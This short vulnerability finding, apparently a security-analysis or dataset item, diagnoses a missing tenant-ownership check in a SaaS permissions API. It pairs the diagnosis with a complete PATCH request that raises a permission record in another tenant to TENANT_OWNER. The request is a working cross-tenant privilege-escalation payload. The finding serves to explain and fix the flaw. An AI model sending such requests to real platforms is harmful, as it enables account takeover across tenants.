diagnosis: The view updates UserTenantPermissions by permission_id without checking that request.user has owner or administrator authority over tenant_perm.tenant. An authenticated administrator in Tenant A can specify the permission_id of an account in Tenant B and elevate it to administrative or superuser privileges.
exploit_request:
PATCH /api/tenants/permissions/4910/ HTTP/1.1
Host: auth.saas-platform.com
Authorization: Bearer <tenant_a_admin_token>
Content-Type: application/json

{"role": "TENANT_OWNER"}
